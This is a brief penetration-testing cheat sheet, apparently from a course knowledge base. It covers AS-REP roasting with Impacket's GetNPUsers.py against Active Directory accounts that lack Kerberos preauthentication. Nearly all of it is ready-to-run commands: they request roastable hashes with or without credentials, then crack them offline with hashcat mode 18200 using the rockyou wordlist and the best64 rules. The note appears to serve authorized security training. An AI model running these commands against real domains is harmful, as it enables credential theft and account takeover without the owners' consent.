---
tags:
---
# GetNPUsers

Queries target domain for users with 'Do not require Kerberos preauthentication' enabled and export their TGTs for cracking ([AS-REP roasting](https://www.youtube.com/watch?v=EVdwnBFtUtQ))

## Capabilities

```powershell
# ASREPRoast with usersfile
GetNPUsers.py -usersfile $USERSFILE -outputfile hashes.asreproast $DOMAIN/

# ASREPRoast with authentication (users queried via LDAP)
GetNPUsers.py -request -outputfile hashes.asreproast $DOMAIN/$USER:'$PASSWD'
```

Crack the hash in hashcat

```powershell
# Linux
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# Windows
.\hashcat.exe -m 18200 hashes\pen-200\hashes.asreproast wordlists\rockyou.txt -r rules\best64.rule --force
```
